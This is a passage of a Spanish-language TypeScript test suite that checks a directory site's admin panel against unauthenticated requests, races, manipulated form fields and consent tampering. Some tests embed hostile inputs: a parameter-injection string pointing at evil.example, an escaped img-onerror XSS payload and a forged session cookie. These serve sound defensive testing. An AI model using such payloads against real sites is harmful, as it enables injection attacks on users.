  // la guarda (`haySesionValida` devuelve false) y a mano; aquí se comprueba
  // sobre las DOS Server Actions reales, mirando la base después.
  it.each<[string, (id: string) => Promise<unknown>]>([
    [
      "aprobar",
      (id) => {
        const formData = new FormData();
        formData.append("origen", "organico");
        return aprobarRegistroAccion(id, formData);
      },
    ],
    [
      "rechazar",
      (id) => {
        const formData = new FormData();
        formData.set("motivo", "Motivo ficticio que no debe guardarse");
        return rechazarRegistroAccion(id, formData);
      },
    ],
  ])("%s con una cookie bien firmada pero sin configuración no toca la base", async (_caso, ejecutar) => {
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Ficticio con el panel apagado",
        categoriaId,
        coloniaId,
        whatsapp: "7719996040",
        consintioAvisoEn: new Date(),
      },
    });

    // Cookie legítima, firmada con el secreto de siempre...
    conSesion();
    // ...y el panel se queda sin configuración justo después.
    delete process.env[VARIABLE_CONTRASENA];
    delete process.env[VARIABLE_SECRETO_SESION];

    try {
      const destino = await urlDeRedireccion(() => ejecutar(fila.id));
      expect(destino).toBe("/admin");
    } finally {
      process.env[VARIABLE_CONTRASENA] = CONTRASENA;
      process.env[VARIABLE_SECRETO_SESION] = SECRETO;
    }

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: fila.id } });
    expect(despues.estado).toBe("en_revision");
    expect(despues.publicadoEn).toBeNull();
    expect(despues.rechazadoEn).toBeNull();
    expect(despues.motivoRechazo).toBeNull();
  });
});

// ── 8. El reenvío escribe sin condicionar el estado (carrera con el panel) ───

describe("adversarial · carrera entre el reenvío público y la resolución del panel", () => {
  /**
   * HALLAZGO MEDIO 2 de la etapa C, ya CORREGIDO (iteración 2 del dev).
   *
   * `procesarRegistro` leía el estado y DESPUÉS escribía con
   * `update({ where: { id } })`, sin repetir la condición `estado: rechazado`
   * — justo lo que `design.md` §5 prohíbe para las transiciones del panel.
   *
   * Si entre la lectura y la escritura alguien resolvía esa ficha (dos
   * reenvíos casi simultáneos y una aprobación en medio), el reenvío pisaba la
   * resolución: la ficha publicada volvía a `en_revision` con los datos del
   * envío, desaparecía del directorio y conservaba su `publicadoEn`, un estado
   * que ninguna transición legítima produce.
   *
   * Ahora la escritura del reenvío va condicionada a `estado: rechazado` y,
   * si no afecta ninguna fila, el envío se responde como el duplicado que es.
   *
   * Aquí la ventana se abre a propósito envolviendo el cliente Prisma, que es
   * el único modo determinista de reproducir una carrera de milisegundos.
   */
  it(
    "un reenvío que leyó `rechazado` no pisa una ficha ya publicada",
    async () => {
      const previa = await prisma.negocio.create({
        data: {
          nombre: "Ficha Ficticia Rechazada",
          categoriaId,
          coloniaId,
          whatsapp: "7719996001",
          consintioAvisoEn: new Date("2026-08-20T09:00:00.000Z"),
          estado: "rechazado",
          rechazadoEn: new Date("2026-08-21T10:00:00.000Z"),
          motivoRechazo: "Motivo ficticio",
        },
      });

      // Cliente idéntico al real salvo que, justo después de la consulta de
      // duplicado, otra pestaña resuelve el registro.
      const clienteConVentana = {
        ...prisma,
        negocio: {
          ...prisma.negocio,
          findUnique: async (args: Parameters<typeof prisma.negocio.findUnique>[0]) => {
            const fila = await prisma.negocio.findUnique(args);
            await prisma.negocio.update({
              where: { id: previa.id },
              data: { estado: "en_revision" },
            });
            await aprobarRegistro(prisma, previa.id, {
              girosIds: [],
              coloniaId: null,
              origen: "organico",
            });
            return fila;
          },
          findMany: prisma.negocio.findMany.bind(prisma.negocio),
          create: prisma.negocio.create.bind(prisma.negocio),
          update: prisma.negocio.update.bind(prisma.negocio),
          // La corrección del dev escribe el reenvío con `updateMany`: va
          // ligado como los demás para que la prueba falle si la escritura no
          // llega a ocurrir, y no por un error del envoltorio.
          updateMany: prisma.negocio.updateMany.bind(prisma.negocio),
          count: prisma.negocio.count.bind(prisma.negocio),
        },
      } as unknown as Parameters<typeof procesarRegistro>[1]["prisma"];

      const resultado = await procesarRegistro(
        envio({ nombre: "Datos Ficticios del Reenvío" }),
        { prisma: clienteConVentana, ip: IP },
      );

      const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: previa.id } });
      expect(despues.estado).toBe("publicado");
      expect(despues.nombre).toBe("Ficha Ficticia Rechazada");
      // Y el reenvío perdedor recibe el mensaje de duplicado de siempre, que
      // es lo que corresponde a una ficha que ya no está rechazada: ni un
      // error técnico, ni un falso "gracias".
      expect(resultado.exito).toBe(false);
      if (!resultado.exito) {
        expect(resultado.estado.errores.whatsapp).toBe(
          MENSAJES_ERROR_REGISTRO.whatsappDuplicado,
        );
      }
    },
  );
});

// ── 9. La constancia de consentimiento frente a un reenvío ajeno ─────────────

describe("adversarial · el reenvío y la constancia LFPDPPP del titular", () => {
  const CONSENTIMIENTO_ORIGINAL = new Date("2026-08-20T09:00:00.000Z");

  /** Ficha rechazada de un titular que sí consintió en su día. */
  async function fichaRechazada() {
    return prisma.negocio.create({
      data: {
        nombre: "Plomería Ficticia La de Antes",
        categoriaId,
        coloniaId,
        whatsapp: "7719996001",
        consintioAvisoEn: CONSENTIMIENTO_ORIGINAL,
        registradoEn: CONSENTIMIENTO_ORIGINAL,
        estado: "rechazado",
        rechazadoEn: new Date("2026-08-21T10:00:00.000Z"),
        motivoRechazo: "Motivo ficticio",
      },
    });
  }

  // Corrección del hallazgo MEDIO 4: el reenvío ya no pisa `consintioAvisoEn`.
  // Se fija aquí desde el ángulo del atacante: un tercero que sondea números
  // rechazados no puede mover ni un milisegundo la evidencia del titular.
  it("un reenvío ajeno no puede mover ni borrar la constancia del titular", async () => {
    const previa = await fichaRechazada();

    const resultado = await procesarRegistro(
      envio({ nombre: "Datos Ficticios de un Tercero" }),
      { prisma, ip: IP },
    );
    expect(resultado).toEqual({ exito: true });

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: previa.id } });
    // La ficha sí quedó pisada (riesgo asumido en design.md §6)…
    expect(despues.nombre).toBe("Datos Ficticios de un Tercero");
    expect(despues.estado).toBe("en_revision");
    // …pero la evidencia del consentimiento NO: ni se mueve, ni se anula.
    expect(despues.consintioAvisoEn.toISOString()).toBe(
      CONSENTIMIENTO_ORIGINAL.toISOString(),
    );
    // Y el reloj de la cola sí se reinicia, que es lo que la spec pide.
    expect(despues.registradoEn.getTime()).toBeGreaterThan(
      CONSENTIMIENTO_ORIGINAL.getTime(),
    );
  });

  /**
   * La otra cara de la misma decisión: conservar la constancia vieja NO puede
   * volverse "el consentimiento ya no hace falta en el reenvío". Si esta
   * prueba se pusiera roja, el sistema estaría tratando datos nuevos amparado
   * en un consentimiento que el envío actual nunca afirmó.
   */
  it.each([
    ["sin la casilla", {}],
    ["con la casilla en un valor que no afirma", { consentimiento: "false" }],
  ])("un reenvío %s no toca la ficha rechazada", async (_caso, extra) => {
    const previa = await fichaRechazada();

    const formData = envio(extra as Record<string, string>);
    if (Object.keys(extra as object).length === 0) formData.delete("consentimiento");

    const resultado = await procesarRegistro(formData, { prisma, ip: IP });

    expect(resultado.exito).toBe(false);
    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: previa.id } });
    expect(despues.nombre).toBe("Plomería Ficticia La de Antes");
    expect(despues.estado).toBe("rechazado");
    expect(despues.motivoRechazo).toBe("Motivo ficticio");
  });

  // El titular legítimo que reenvía para "renovar" su consentimiento vuelve a
  // marcar la casilla y el sistema lo exige, pero la fecha guardada sigue
  // siendo la del alta: la constancia queda más vieja que los datos que
  // ampara. Es la contrapartida aceptada de MEDIO 4 y se fija a la vista para
  // que nadie la descubra por sorpresa (ver c-seguridad.md, BAJO 4).
  it("tras un reenvío legítimo la constancia es más antigua que los datos que ampara", async () => {
    const previa = await fichaRechazada();

    await procesarRegistro(envio({ nombre: "Plomería Ficticia Ya Corregida" }), {
      prisma,
      ip: IP,
    });

    const despues = await prisma.negocio.findUniqueOrThrow({ where: { id: previa.id } });
    expect(despues.consintioAvisoEn.getTime()).toBeLessThan(
      despues.registradoEn.getTime(),
    );
  });
});

// ── 10. Despublicar y borrado definitivo (change agregar-despublicar-y-borrado-arco) ──

describe("adversarial · despublicar y borrar sin sesión o con entrada manipulada", () => {
  /** Ficha publicada con datos capturados por el formulario público. */
  async function fichaPublicada(sufijo: string): Promise<string> {
    const fila = await prisma.negocio.create({
      data: {
        nombre: "Negocio Ficticio Publicado",
        categoriaId,
        coloniaId,
        whatsapp: `771999610${sufijo}`,
        consintioAvisoEn: new Date(),
        estado: "publicado",
        publicadoEn: new Date(),
      },
    });
    return fila.id;
  }

  const abrirConfirmacionBorrado = (id: string) =>
    render(
      ConfirmarBorradoPage({
        params: Promise.resolve({ id }),
        searchParams: Promise.resolve({}),
      }) as Promise<React.ReactElement>,
    );

  // Scenario: despublicar sin sesión
  it("un POST de despublicar sin cookie no baja la ficha ni devuelve nada suyo", async () => {
    const id = await fichaPublicada("1");
    const formData = new FormData();
    formData.set("motivo", "motivo mandado sin sesión");

    const url = await urlDeRedireccion(() => despublicarRegistroAccion(id, formData));

    expect(url).toBe("/admin");
    expect(url).not.toContain(id);
    const negocio = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(negocio.estado).toBe("publicado");
    expect(negocio.despublicadoEn).toBeNull();
    expect(negocio.motivoDespublicacion).toBeNull();
  });

  // Scenario: borrar sin sesión
  it("un POST de borrado sin cookie, con la palabra correcta, no borra nada", async () => {
    const id = await fichaPublicada("2");
    const formData = new FormData();
    formData.set("confirmarBorrado", "BORRAR");

    const url = await urlDeRedireccion(() => borrarRegistroAccion(id, formData));

    expect(url).toBe("/admin");
    expect(await prisma.negocio.findUnique({ where: { id } })).not.toBeNull();
  });

  // Scenario: la pantalla de confirmación sin sesión
  it("un GET de la pantalla de confirmación sin cookie no dice si el id existe", async () => {
    const id = await fichaPublicada("3");

    const existente = await urlDeRedireccion(() => abrirConfirmacionBorrado(id));
    const inventado = await urlDeRedireccion(() =>
      abrirConfirmacionBorrado("no-existe-este-id"),
    );

    expect(existente).toBe("/admin");
    expect(existente).toBe(inventado);
  });

  it("un POST de borrado con un id inexistente no produce error del servidor", async () => {
    conSesion();
    const formData = new FormData();
    formData.set("confirmarBorrado", "BORRAR");

    expect(
      await urlDeRedireccion(() => borrarRegistroAccion("no-existe-este-id", formData)),
    ).toBe("/admin/borrado-hecho?resultado=ya-no-existe");
  });

  it("un POST de borrado con un id vacío tampoco truena ni borra a nadie", async () => {
    const id = await fichaPublicada("4");
    conSesion();
    const formData = new FormData();
    formData.set("confirmarBorrado", "BORRAR");

    expect(await urlDeRedireccion(() => borrarRegistroAccion("", formData))).toBe(
      "/admin/borrado-hecho?resultado=ya-no-existe",
    );
    expect(await prisma.negocio.findUnique({ where: { id } })).not.toBeNull();
  });

  it("el campo del motivo repetido vale por el primero, no se concatena", async () => {
    const id = await fichaPublicada("5");
    conSesion();
    const formData = new FormData();
    formData.append("motivo", "Motivo real");
    formData.append("motivo", "Motivo colado");

    await urlDeRedireccion(() => despublicarRegistroAccion(id, formData));

    const negocio = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(negocio.motivoDespublicacion).toBe("Motivo real");
    expect(negocio.motivoDespublicacion).not.toContain("Motivo colado");
  });

  it("un motivo que no es texto (un archivo) se trata como vacío y no despublica", async () => {
    const id = await fichaPublicada("6");
    conSesion();
    const formData = new FormData();
    formData.set("motivo", new File(["contenido"], "motivo.txt"));

    expect(await urlDeRedireccion(() => despublicarRegistroAccion(id, formData))).toBe(
      `/admin/registros/${id}?errorDespublicar=motivo`,
    );
    expect((await prisma.negocio.findUniqueOrThrow({ where: { id } })).estado).toBe(
      "publicado",
    );
  });

  it("un motivo de 10 000 caracteres se rechaza con su error, sin escribir nada", async () => {
    const id = await fichaPublicada("7");
    conSesion();
    const formData = new FormData();
    formData.set("motivo", "x".repeat(10_000));

    // Hallazgo BAJO 3 de la etapa C: recortarlo en silencio mandaba al negocio
    // un WhatsApp cortado a media palabra. Ahora el admin ve el error y lo
    // acorta él.
    expect(await urlDeRedireccion(() => despublicarRegistroAccion(id, formData))).toBe(
      `/admin/registros/${id}?errorDespublicar=longitud`,
    );

    const negocio = await prisma.negocio.findUniqueOrThrow({ where: { id } });
    expect(negocio.estado).toBe("publicado");
    expect(negocio.motivoDespublicacion).toBeNull();

    // Y el detalle pinta el mensaje, con la cota real dentro.
    const html = await abrirDetalle(id, { errorDespublicar: "longitud" });
    expect(html.replace(/\s+/g, " ")).toContain(
      errorMotivoDespublicarLargo(LIMITE_MOTIVO_DESPUBLICACION),
    );
    expect(html).toContain(String(LIMITE_MOTIVO_DESPUBLICACION));
  });

  it("un motivo con &, saltos de línea y URL no altera el wa.me del aviso", async () => {
    const resultado = await procesarRegistro(envio({ nombre: "Negocio Ficticio Uno" }), {
      prisma,
      ip: IP,
    });
    expect(resultado.exito).toBe(true);
    const fila = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719996001" },
    });
    await aprobarRegistro(prisma, fila.id, {
      girosIds: [],
      coloniaId: null,
      origen: "organico",
    });

    const motivo = `Cerró&text=https://evil.example\nsegunda línea #hash "comillas"`;
    expect(await despublicarFicha(prisma, fila.id, motivo)).toEqual({
      resultado: "despublicada",
    });

    conSesion();
    const url = enlaceWhatsapp(
      await render(
        RegistroDespublicadoPage({
          params: Promise.resolve({ id: fila.id }),
          searchParams: Promise.resolve({}),
        }) as Promise<React.ReactElement>,
      ),
    );

    expect(url.host).toBe("wa.me");
    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.searchParams.get("text")).toBe(
      mensajeAvisoDespublicacion("Negocio Ficticio Uno", motivo),
    );
  });

  it("la pantalla de confirmación del borrado escapa el nombre hostil del negocio", async () => {
    const resultado = await procesarRegistro(envio({ nombre: NOMBRE_HOSTIL }), {
      prisma,
      ip: IP,
    });
    expect(resultado.exito).toBe(true);
    const fila = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719996001" },
    });

    conSesion();
    const html = sinScriptsDeReact(await abrirConfirmacionBorrado(fila.id));
    // El payload sigue ahí, pero como TEXTO: ni una etiqueta viva.
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/onerror="/);
    expect(html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  });
});


// ── 11. Los reportes tampoco se ven ni se tocan sin sesión ──────────────────

describe("adversarial · reportes del panel sin cookie de sesión", () => {
  const COMENTARIO_REPORTE = "El local está cerrado desde hace semanas (dato inventado).";

  /** Negocio publicado con un reporte pendiente y comentario. */
  async function conReportePendiente(): Promise<{ negocioId: string; reporteId: string }> {
    const negocio = await prisma.negocio.create({
      data: {
        nombre: "Lavandería Ficticia Espuma",
        categoriaId,
        coloniaId,
        whatsapp: "7719996040",
        consintioAvisoEn: new Date(),
        estado: "publicado",
        publicadoEn: new Date(),
      },
    });
    const reporte = await prisma.reporte.create({
      data: { negocioId: negocio.id, motivo: "cerrado", comentario: COMENTARIO_REPORTE },
    });
    return { negocioId: negocio.id, reporteId: reporte.id };
  }

  // Scenario: cola sin sesión (delta: "ni ningún conteo de reportes")
  it("la cola no revela ni el nombre del reportado ni su conteo", async () => {
    const { negocioId } = await conReportePendiente();

    const destino = await urlDeRedireccion(() => ColaAdminPage());

    expect(destino).toBe("/admin");
    expect(destino).not.toContain(negocioId);
    expect(destino).not.toContain("reporte");
  });

  // Scenario: detalle de un registro sin sesión (delta: "ni de sus reportes")
  it("el detalle no revela el motivo ni el comentario del reporte", async () => {
    const { negocioId } = await conReportePendiente();

    const destino = await urlDeRedireccion(() =>
      DetalleRegistroAdminPage({
        params: Promise.resolve({ id: negocioId }),
        searchParams: Promise.resolve({}),
      }),
    );

    expect(destino).toBe("/admin");
    expect(destino).not.toContain(COMENTARIO_REPORTE);
    expect(destino).not.toContain("cerrado");
  });

  // Scenario: atender un reporte sin sesión
  it("marcar como atendido sin sesión no escribe nada ni confirma que exista", async () => {
    const { negocioId, reporteId } = await conReportePendiente();

    const destino = await urlDeRedireccion(() =>
      marcarReporteAtendidoAccion(negocioId, reporteId, new FormData()),
    );

    expect(destino).toBe("/admin");
    expect(destino).not.toContain(reporteId);
    expect(destino).not.toContain(negocioId);

    const guardado = await prisma.reporte.findUniqueOrThrow({ where: { id: reporteId } });
    expect(guardado.estado).toBe("pendiente");
    expect(guardado.atendidoEn).toBeNull();
  });

  it("una cookie manipulada vale lo mismo que ninguna para atender reportes", async () => {
    const { negocioId, reporteId } = await conReportePendiente();
    peticion.cookies[NOMBRE_COOKIE_SESION] = `${Date.now() + 100000}.firma-inventada`;

    expect(
      await urlDeRedireccion(() =>
        marcarReporteAtendidoAccion(negocioId, reporteId, new FormData()),
      ),
    ).toBe("/admin");
    expect(
      (await prisma.reporte.findUniqueOrThrow({ where: { id: reporteId } })).estado,
    ).toBe("pendiente");
  });

  // Delta: "El formulario público de reporte solo puede crear reportes
  // `pendiente`: NO DEBE poder marcarlos como atendidos ni tocar nada del
  // negocio."
  it("ninguna superficie pública sabe marcar reportes como atendidos", () => {
    function fuentesDe(dir: string): string[] {
      return readdirSync(dir, { withFileTypes: true }).flatMap((entrada) => {
        const ruta = join(dir, entrada.name);
        if (entrada.isDirectory()) {
          return entrada.name === "admin" || entrada.name === "generated"
            ? []
            : fuentesDe(ruta);
        }
        return /\.tsx?$/.test(entrada.name) ? [ruta] : [];
      });
    }

    const publicas = [
      ...fuentesDe(join(raiz, "src/app")),
      ...fuentesDe(join(raiz, "src/components")),
      ...fuentesDe(join(raiz, "src/lib")),
    ];
    expect(publicas.length).toBeGreaterThanOrEqual(20);

    // `src/lib/reportes/estados.ts` es la única excepción: DECLARA el
    // vocabulario (lo importan los dos lados), pero no escribe nada.
    const declaracion = join(raiz, "src/lib/reportes/estados.ts");

    for (const ruta of publicas) {
      const fuente = readFileSync(ruta, "utf8");
      expect(fuente, ruta).not.toContain("marcarReporteAtendido");
      expect(fuente, ruta).not.toContain('estado: "atendido"');
      if (ruta !== declaracion) {
        expect(fuente, ruta).not.toContain("ESTADO_REPORTE_ATENDIDO");
      }
    }
  });
});
